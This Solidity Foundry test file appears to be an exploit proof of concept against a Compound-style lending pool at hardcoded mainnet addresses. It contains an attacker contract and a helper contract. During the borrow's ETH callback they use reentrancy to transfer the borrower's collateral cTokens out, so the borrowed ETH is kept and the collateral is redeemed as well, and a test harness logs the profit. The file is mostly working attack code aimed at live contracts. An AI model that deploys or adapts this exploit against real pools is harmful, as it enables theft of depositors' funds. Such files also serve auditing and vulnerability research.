// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

/// @dev Pre-approve the helper before borrow. During reentrancy, helper calls transferFrom.
/// This avoids calling approve during reentrancy (already done).
/// The question: does transferFrom hit reentrancy guard?
contract Pool72PreApproveAttacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable public immutable owner;
    Pool72TransferHelper public helper;
    bool borrowInFlight;
    bool reentered;

    constructor(address payable _owner) {
        owner = _owner;
        helper = new Pool72TransferHelper(address(this), _owner);
    }

    function attack() external payable {
        uint256 cash = FETH72.getCash();

        FETH72.mint{value: msg.value}();
        uint256 cTokens = FETH72.balanceOf(address(this));
        console.log("cTokens minted:", cTokens);

        // Pre-approve helper for transferFrom
        FETH72.approve(address(helper), type(uint256).max);
        console.log("Approved helper");

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        uint256 borrowAmt = cash - 1;
        (,uint256 liq,) = COMPTROLLER.getAccountLiquidity(address(this));
        if (borrowAmt > liq) borrowAmt = liq;
        console.log("Borrow amt:", borrowAmt);

        borrowInFlight = true;
        uint256 result = FETH72.borrow(borrowAmt);
        borrowInFlight = false;

        console.log("Borrow result:", result);
        console.log("Reentered:", reentered);

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;
        console.log("=== REENTRANT ===");

        // During reentrancy, call helper to do transferFrom
        // The helper is a separate contract - but the reentrancy guard
        // is pool-wide via the comptroller
        uint256 cTokens = FETH72.balanceOf(address(this));
        console.log("cTokens to transfer:", cTokens);

        try helper.grabTokens(cTokens) {
            console.log("Helper grab succeeded!");
        } catch Error(string memory reason) {
            console.log("Helper grab failed:", reason);
        } catch {
            console.log("Helper grab failed (unknown)");
        }
    }
}

contract Pool72TransferHelper {
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address public immutable attacker;
    address payable public immutable owner;

    constructor(address _attacker, address payable _owner) {
        attacker = _attacker;
        owner = _owner;
    }

    function grabTokens(uint256 amount) external {
        console.log("Helper: attempting transferFrom");
        bool ok = FETH72.transferFrom(attacker, owner, amount);
        console.log("Helper: transferFrom result:", ok);
    }

    receive() external payable {}
}

contract Pool72Test8 is Test {
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    function testPreApproveTransfer() public {
        address payable attacker = payable(address(0xBEEF));
        vm.deal(attacker, 500 ether);

        vm.startPrank(attacker);
        Pool72PreApproveAttacker a = new Pool72PreApproveAttacker(attacker);

        uint256 cash = FETH72.getCash();
        uint256 deposit = cash * 2 + 2 ether;

        uint256 balBefore = attacker.balance;
        a.attack{value: deposit}();

        // Check if cTokens were transferred to owner
        uint256 ownerCTokens = FETH72.balanceOf(attacker);
        console.log("Owner cTokens after attack:", ownerCTokens);

        if (ownerCTokens > 0) {
            uint256 redeemResult = FETH72.redeem(ownerCTokens);
            console.log("Redeem result:", redeemResult);
        }

        uint256 balAfter = attacker.balance;
        if (balAfter > balBefore) {
            console.log("PROFIT:", balAfter - balBefore);
        } else {
            console.log("LOSS:", balBefore - balAfter);
        }
        vm.stopPrank();
    }
}
